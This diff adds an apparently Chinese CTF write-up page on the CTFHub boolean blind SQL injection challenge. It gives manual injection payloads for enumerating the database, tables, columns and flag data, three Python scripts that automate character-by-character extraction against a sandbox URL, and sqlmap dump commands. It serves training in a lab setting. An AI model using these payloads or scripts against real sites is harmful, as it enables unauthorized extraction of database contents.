@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN"  class="">
+
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="keywords" content="">
+    
+    
+    <meta name="description" content="">
+    
+    <meta name="generator" content="teedoc">
+    <meta name="theme" content="teedoc-plugin-theme-default">
+    
+        
+        <meta name="markdown-generator" content="teedoc-plugin-markdown-parser">
+        
+        <script>
+MathJax = {"loader": {"load": ["output/svg"]}, "tex": {"inlineMath": [["$", "$"], ["\\(", "\\)"]]}, "svg": {"fontCache": "global"}};
+</script>
+        
+        <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+        
+        <script src="/static/js/theme_default/pre_main.js"></script>
+        
+        <link rel="stylesheet" href="/static/css/theme_default/prism.min.css" type="text/css"/>
+        
+        <link rel="stylesheet" href="/static/css/theme_default/viewer.min.css" type="text/css"/>
+        
+        <link rel="stylesheet" href="/static/css/theme_default/dark.css" type="text/css"/>
+        
+        <link rel="stylesheet" href="/static/css/theme_default/light.css" type="text/css"/>
+        
+        <script src="/static/js/theme_default/jquery.min.js"></script>
+        
+        <script src="/static/js/theme_default/split.js"></script>
+        
+        <link rel="stylesheet" href="/static/css/search/style.css" type="text/css"/>
+        
+        <link rel="stylesheet" href="/static/css/custom.css" type="text/css"/>
+        
+    
+    
+    <title>布尔盲注 - H4ckVortex</title>
+    
+    <script type="text/javascript">js_vars = {}</script>
+    <script type="text/javascript">metadata = {"tags": [], "date": false, "update": [], "ts": 0, "author": "", "brief": "", "cover": "", "description": "2019 | 技能树 | Web | 布尔盲注"}</script>
+</head>
+
+
+<body class="type_doc">
+    
+    <div id="navbar">
+        <div id="navbar_menu">
+            <a class="site_title" href="/">
+                
+                
+                    <h2>H4ckVortex</h2>
+                
+        </a>
+            <a id="navbar_menu_btn"></a>
+        </div>
+        <div id="navbar_items">
+            <div>
+                <ul id="nav_left">
+<li class=""><a  href="/arduino/">Arduino</a></li>
+<li class="active"><a  href="/web/">Web</a></li>
+<li class=""><a  href="/misc/">Misc</a></li>
+<li class=""><a  href="/forensics/">Forensics</a></li>
+<li class=""><a  href="/userscript/">UserScript</a></li>
+<li class=""><a  href="/other/">Other</a></li>
+</ul>
+
+            </div>
+            <div>
+                <ul id="nav_right">
+</ul>
+
+                <ul class="nav_plugins"><li><a id="themes" class="light"></a></li></ul><ul class="nav_plugins"><li><a id="search"><span class="icon"></span><span class="placeholder">搜索</span>
+                            <div id="search_hints">
+                                <span id="search_input_hint">输入关键词，多关键词空格隔开</span>
+                                <span id="search_loading_hint">正在加载，请稍候。。。</span>
+                                <span id="search_download_err_hint">下载文件失败，请刷新重试或检查网络</span>
+                                <span id="search_other_docs_result_hint">来自其它文档的结果</span>
+                                <span id="search_curr_doc_result_hint">当前文档搜索结果</span>
+                            </div></a></li></ul>
+            </div>
+        </div>
+    </div>
+    
+    <div id="wrapper">
+        <div id="sidebar_wrapper">
+            <div id="sidebar">
+                <div id="sidebar_title">
+                    
+                </div>
+                <ul class="show">
+<li class="not_active with_link"><a href="/web/CTF导航.html"><span class="label">CTF导航</span><span class=""></span></a></li>
+<li class="not_active with_link"><a href="/web/Flask_PIN码伪造.html"><span class="label">Flask_PIN码伪造</span><span class=""></span></a></li>
+<li class="not_active with_link"><a href="/web/Flask_session伪造.html"><span class="label">Flask_session伪造</span><span class=""></span></a></li>
+<li class="active with_link"><a href="/web/2019-技能树-Web-布尔盲注/布尔盲注.html"><span class="label">布尔盲注</span><span class=""></span></a></li>
+<li class="not_active with_link"><a href="/web/md5绕过汇总.html"><span class="label">md5绕过汇总</span><span class=""></span></a></li>
+<li class="not_active with_link"><a href="/web/PHP小特性.html"><span class="label">PHP小特性</span><span class=""></span></a></li>
+<li class="not_active with_link"><a href="/web/SQL注入漏洞.html"><span class="label">SQL注入漏洞</span><span class=""></span></a></li>
+</ul>
+
+            </div>
+        </div>
+        <div id="article">
+            <div id="menu_wrapper">
+                <div id="menu">
+                </div>
+            </div>
+            <div id="content_wrapper">
+                <div id="content_body">
+                    <div id="article_head">
+                        <div id="article_title">
+                            
+                            <h1>布尔盲注</h1>
+                            
+                        </div>
+                        <div id="article_tags">
+                            <ul>
+                            
+                            </ul>
+                        </div>
+                        <div id="article_info">
+                        <div id="article_info_left">
+                            <span class="article_author">
+                                
+                            </span>
+                            
+                        </div>
+                        <div id="article_info_right">
+                            
+                        </div>
+                        </div>
+                    </div>
+                    <div id="article_tools">
+                        <span></span>
+                        <span id="toc_btn"></span>
+                    </div>
+                    <div id="update_history">
+                        
+                    </div>
+                    <div id="article_content">
+                        
+                            <!--more-->
+<h2 id="%E9%A2%98%E7%9B%AE%E8%80%83%E7%82%B9">题目考点</h2>
+<ul>
+<li>SQL注入</li>
+<li>布尔盲注</li>
+</ul>
+<hr />
+<h2 id="%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF">解题思路</h2>
+<h3 id="tips">tips</h3>
+<p>在注入语句时应当注意是在输入框中输入数据还是直接拼接在url后面，ctfhub的输入框似乎并不会正确识别“=”符号，部分浏览器的地址栏并不会将“#”正确转义成注释符。<br />
+可以直接用相关符号的URL编码进行手工转义后拼接在url后面确保能被正确识别。</p>
+
+<pre class="language-none"><code class="language-none">%27 # 单引号' 的 URL 编码
+%20 # 空格  的 URL 编码
+%3C # 小于号&lt; 的 URL 编码
+%3E # 大于号&gt; 的 URL 编码
+</code></pre>
+<h3 id="%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90">注入分析</h3>
+<p>访问id=1，虽然无法知道从数据库检索出来的数据是什么，但此时能够从数据库中检索出非空数据。<br />
+<img src="images%5C1.png" alt="" /></p>
+<p>访问id=-1，则不能从数据库中检索出数据。<br />
+<img src="images%5C2.png" alt="" /></p>
+<p>用and语句拼接布尔表达式，注入的布尔表达式结果为 true 时，返回query_success。<br />
+而注入的布尔表达式结果为 false 时，返回query_error。</p>
+<p>访问id=1 and 1=1，返回query_success。<br />
+<img src="images%5C3.png" alt="" /></p>
+<p>访问id=1 and 1=1，返回query_error。<br />
+<img src="images%5C4.png" alt="" /></p>
+<p>访问id=1’ and 1=1 #，返回query_error。<br />
+<img src="images%5C5.png" alt="" /></p>
+<p>说明存在注入，并且是数字型的注入，如果是字符型的注入，则需要闭合前面的单引号和注释掉后面的多余字符。</p>
+<p>通过这种方式，根据页面返回值的不同，得知注入的布尔表达式结果是 True 或者 False。这种方法就叫布尔盲注！</p>
+<h3 id="%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5">手工注入</h3>
+<h4 id="%E7%8C%9C%E8%A7%A3%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6">猜解库名长度</h4>
+<p><code>1 and length(database())=1</code><br />
+<img src="images%5C6.png" alt="" /></p>
+<p>通过穷举法进行尝试，当注入<code>1 and length(database())=4</code>时，返回query_success，说明当前使用的数据库名长度为4。<br />
+<img src="images%5C7.png" alt="" /></p>
+<p>database()：返回当前使用数据库名称<br />
+length()：返回字符串的长度</p>
+<h4 id="%E7%8C%9C%E8%A7%A3%E5%BA%93%E5%90%8D">猜解库名</h4>
+<p>通过二分法进行尝试，不断注入逐步猜解出库名的每一位字符。</p>
+<p>substr(str, pos, len)：截取字符串，str为字符串，pos为起始位置，len为截取字符长度。<br />
+ascii()：返回字符的ascii码</p>
+<p><a href="https://www.runoob.com/w3cnote/ascii.html"  target="_blank">ASCII 表 | 菜鸟教程</a></p>
+<p>以猜解库名的第一位字符为例，注入流程如下：</p>
+<p><code>1 and ascii(substr(database(),1,1))&gt;97</code><br />
+返回query_success，说明数据库名的第⼀个字符的ascii值⼤于97，97为⼩写字母a的ascii值。<br />
+<img src="images%5C8.png" alt="" /></p>
+<p><code>1 and ascii(substr(database(),1,1))&lt;122</code><br />
+返回query_success，说明数据库名的第⼀个字符的ascii值⼩于 122，122为⼩写字母z的ascii值。</p>
+<p><code>1 and ascii(substr(database(),1,1))&lt;109</code><br />
+返回query_error，说明数据库名的第⼀个字符的ascii值不小于 109，109为⼩写字母m的ascii值。</p>
+<p><code>1 and ascii(substr(database(),1,1))&lt;116</code><br />
+返回query_success，说明数据库名的第⼀个字符的ascii值小于 116，116为⼩写字母t的ascii值。</p>
+<p>范围较小时使用穷举法在已知范围内逐个尝试。<br />
+<code>1 and ascii(substr(database(),1,1))=115</code><br />
+返回query_success，说明数据库名的第⼀个字符的ascii值等于115，115为⼩写字母s的ascii值。<br />
+<img src="images%5C9.png" alt="" /></p>
+<p>当注入<code>1 and ascii(substr(database(),2,1))&gt;=113</code>时，返回query_success，说明数据库名的第二个字符的ascii值等于113，113为⼩写字母q的ascii值。<br />
+<img src="images%5C10.png" alt="" /></p>
+<p>猜解库名的其他位字符，方法同上，得出完整的数据库名为“sqli”。</p>
+<h4 id="%E7%8C%9C%E8%A7%A3%E8%A1%A8%E7%9A%84%E6%95%B0%E9%87%8F">猜解表的数量</h4>
+<p>注入<code>1 and (select count(table_name) from information_schema.tables where table_schema=database())=1</code>，返回query_error，说明表的数量不为1。</p>
+<p>注入<code>1 and (select count(table_name) from information_schema.tables where table_schema=database())=2</code>，返回query_success，说明表的数量为2。<br />
+<img src="images%5C11.png" alt="" /></p>
+<p>count(列名)：返回列名指定列的记录数</p>
+<h4 id="%E7%8C%9C%E8%A7%A3%E8%A1%A8%E5%90%8D%E9%95%BF%E5%BA%A6">猜解表名长度</h4>
+<p>注入<code>1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=4</code>，返回query_success，说明第一个表名长度为4。</p>
+<p>猜解第二个表名的长度则将 limit() 的第一个参数值由0修改为1。</p>
+<p>limit(i,n)：从第i行数据开始，取n条数据，i从0开始。</p>
+<h4 id="%E7%8C%9C%E8%A7%A3%E8%A1%A8%E5%90%8D">猜解表名</h4>
+<p>猜解第一个表名的第一个字符，返回query_success，说明第一个表名的第一个字符为f。<br />
+<code>1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=102</code></p>
+<p>注入流程与方法参考猜解库名，最终得出完整的第一个表名为“flag”。</p>
+<p>猜解第二个表名则将 limit() 的第一个参数值由0修改为1。</p>
+<p>完整的第二个表名“news”。</p>
+<h4 id="%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E7%9A%84%E6%95%B0%E9%87%8F">猜解字段的数量</h4>
+<p>猜解表flag的字段数量，返回query_success，说明表名flag的字段数量为1。<br />
+<code>1 and (select count(column_name) from information_schema.columns where table_name='flag')=1</code></p>
+<h4 id="%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E5%90%8D%E7%9A%84%E9%95%BF%E5%BA%A6">猜解字段名的长度</h4>
+<p>猜解表flag中第一个字段名的长度，返回query_success，说明表flag中第一个字段名的长度为4。<br />
+<code>1 and length(substr((select column_name from information_schema.columns where table_name= 'flag' limit 0,1),1))=4</code></p>
+<p>若该表有第二个字段，猜解第二个字段名的长度则将 limit() 的第一个参数值由0修改为1。</p>
+<h4 id="%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E5%90%8D">猜解字段名</h4>
+<p>猜解表flag中第一个字段名的第一个字符，返回query_success，说明表flag中第一个字段名的第一个字符为f。<br />
+<code>1 and ascii(substr((select column_name from information_schema.columns where table_name= 'flag' limit 0,1),1,1))=102</code></p>
+<p>若该表有第二个字段，猜解第二个字段名则将 limit() 的第一个参数值由0修改为1。</p>
+<p>注入流程与方法参考猜解库名，最终得出表flag中完整的第一个字段名为“flag”。</p>
+<h4 id="%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE">获取数据</h4>
+<p>注入如下语句，返回query_success，说明 sqli.flag 表下的 flag 列的第一个数据内容为小写字母c。<br />
+<code>1 and ascii(substr((select flag from sqli.flag limit 0,1),1,1))=99</code></p>
+<p>若有第二个数据，猜解第二个数据则将 limit() 的第一个参数值由0修改为1。</p>
+<p>注入流程与方法参考猜解库名，最终可得出表 sqli.flag 下的 flag 列中完整的第一个数据内容。</p>
+<h3 id="%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5">脚本注入</h3>
+<p>我们可以用Python编写脚本来对目标网站进行自动注入。</p>
+<p>mid()函数和substr()函数的使用方法类似。</p>
+<h4 id="%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D%E7%A7%B0">获取当前数据库中所有表名称</h4>
+
+<pre class="language-python"><code class="language-python">#-- coding:UTF-8 --
+import requests
+
+#目标url
+url = 'http://challenge-3e5842a08066e481.sandbox.ctfhub.com:10800/?id=1'
+#设置一个空字符串，用于存放查询出来数据
+result = ''
+#i表示表的长度，一般不会超过30
+for i in range(1,30):
+    #j表示ascii码（字母、数字还有一些特殊符号）
+    for j in range(32,127):
+        #注入语句
+        payload = &quot; and (select ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()), {}, 1))) = {}&quot;.format(i,j)
+        #将网址和注入语句拼接成访问请求
+        r = requests.get(url+payload)
+        #print(r.text)
+
+        if('query_success' in r.text):        
+            #将匹配到的字符添加到result中
+            result += chr(j)
+            #打印匹配到的字符
+            print(result)
+            #跳出此次循环
+            break
+</code></pre>
+<p><img src="images%5C12.png" alt="" /></p>
+<h4 id="%E8%8E%B7%E5%8F%96%E8%A1%A8flag%E4%B8%AD%E6%89%80%E6%9C%89%E5%AD%97%E6%AE%B5%E5%90%8D%E7%A7%B0">获取表flag中所有字段名称</h4>
+
+<pre class="language-python"><code class="language-python">#-- coding:UTF-8 --
+import requests
+
+#目标url
+url = 'http://challenge-3e5842a08066e481.sandbox.ctfhub.com:10800/?id=1'
+#设置一个空字符串，用于存放查询出来数据
+result = ''
+#i表示表的长度，一般不会超过30
+for i in range(1,30):
+    #j表示ascii码（字母、数字还有一些特殊符号）
+    for j in range(32,127):
+        #注入语句
+        payload = &quot; and (select ascii(mid((select group_concat(column_name) from information_schema.columns where table_name='flag'), {}, 1))) = {}&quot;.format(i,j)
+
+        #将网址和注入语句拼接成访问请求
+        r = requests.get(url+payload)
+        #print(r.text)
+
+        if('query_success' in r.text):        
+            #将匹配到的字符添加到result中
+            result += chr(j)
+            #打印匹配到的字符
+            print(result)
+            #跳出此次循环
+            break
+</code></pre>
+<p><img src="images%5C13.png" alt="" /></p>
+<h4 id="%E8%8E%B7%E5%8F%96%E8%A1%A8flag%E4%B8%AD%E5%AD%97%E6%AE%B5flag%E7%9A%84%E6%95%B0%E6%8D%AE">获取表flag中字段flag的数据</h4>
+
+<pre class="language-python"><code class="language-python">#-- coding:UTF-8 --
+import requests
+
+#目标url
+url = 'http://challenge-3e5842a08066e481.sandbox.ctfhub.com:10800/?id=1'
+#设置一个空字符串，用于存放查询出来数据
+result = ''
+#i表示表的长度，一般不会超过50
+for i in range(1,50):
+    #j表示ascii码（字母、数字还有一些特殊符号）
+    for j in range(32,127):
+        #注入语句
+        payload = &quot; and (select ascii(mid((select concat(flag) from flag), {}, 1))) = {}&quot;.format(i,j)
+
+        #将网址和注入语句拼接成访问请求
+        r = requests.get(url+payload)
+        #print(r.text)
+
+        if('query_success' in r.text):        
+            #将匹配到的字符添加到result中
+            result += chr(j)
+            #打印匹配到的字符
+            print(result)
+            #跳出此次循环
+            break
+</code></pre>
+<p><img src="images%5C14.png" alt="" /></p>
+<h3 id="%E4%BD%BF%E7%94%A8sqlmap">使用sqlmap</h3>
+<h4 id="%E8%8E%B7%E5%8F%96%E5%BA%93%E5%90%8D">获取库名</h4>
+<p><code>python sqlmap.py -u &quot;http://challenge-3e5842a08066e481.sandbox.ctfhub.com:10800/?id=1&quot; --dbs</code></p>
+<h4 id="%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D">获取表名</h4>
+<p><code>python sqlmap.py -u &quot;http://challenge-3e5842a08066e481.sandbox.ctfhub.com:10800/?id=1&quot; -D sqli --tables</code><br />
+<img src="images%5C15.png" alt="" /></p>
+<h4 id="%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D">获取字段名</h4>
+<p><code>python sqlmap.py -u &quot;http://challenge-3e5842a08066e481.sandbox.ctfhub.com:10800/?id=1&quot; -D sqli -T flag --columns</code></p>
+<h4 id="%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE">获取数据</h4>
+<p><code>python sqlmap.py -u &quot;http://challenge-3e5842a08066e481.sandbox.ctfhub.com:10800/?id=1&quot; -D sqli -T flag -C flag --dump</code><br />
+<img src="images%5C16.png" alt="" /></p>
+<hr />
+<h2 id="FLAG">FLAG</h2>
+<p>此题为动态FLAG。</p>
+
+                        
+                    </div>
+                </div>
+                <div id="previous_next">
+                    <div id="previous">
+                        
+                        <a href="/web/Flask_session伪造.html">
+                            <span class="icon"></span>
+                            <span class="label">Flask_session伪造</span>
+                        </a>
+                        
+                    </div>
+                    <div id="next">
+                        
+                        <a href="/web/md5绕过汇总.html">
+                            <span class="label">md5绕过汇总</span>
+                            <span class="icon"></span>
+                        </a>
+                        
+                    </div>
+                </div>
+                <div id="comments-container"></div>
+            </div>
+            <div id="toc_wrapper">
+                <div id="toc">
+                    <div id="toc_content">
+                            
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <a id="to_top" href="#"></a>
+    <div id="doc_footer">
+        <div id="footer">
+            <div id="footer_top">
+                <ul>
+<li><a></a><ul><li><a target="_blank" href="/#"></a></li>
+</ul>
+</li>
+</ul>
+
+            </div>
+            <div id="footer_bottom">
+                <ul>
+<li><a target="_blank" href="https://github.com/teedoc/teedoc">Generated by teedoc</a></li>
+</ul>
+
+            </div>
+        </div>
+    </div>
+    
+        <script src="/teedoc-plugin-markdown-parser/mermaid.min.js"></script>
+    
+        <script>mermaid.initialize({startOnLoad:true});</script>
+    
+        <script src="/static/js/theme_default/tocbot.min.js"></script>
+    
+        <script src="/static/js/theme_default/main.js"></script>
+    
+        <script src="/static/js/theme_default/viewer.min.js"></script>
+    
+        <script src="/static/css/theme_default/prism.min.js"></script>
+    
+        <script src="/static/js/search/search_main.js"></script>
+    
+        <script src="/static/js/custom.js"></script>
+    
+        <script type="text/javascript" src="/static/js/live.js"></script>
+    
+</body>
+
+</html>
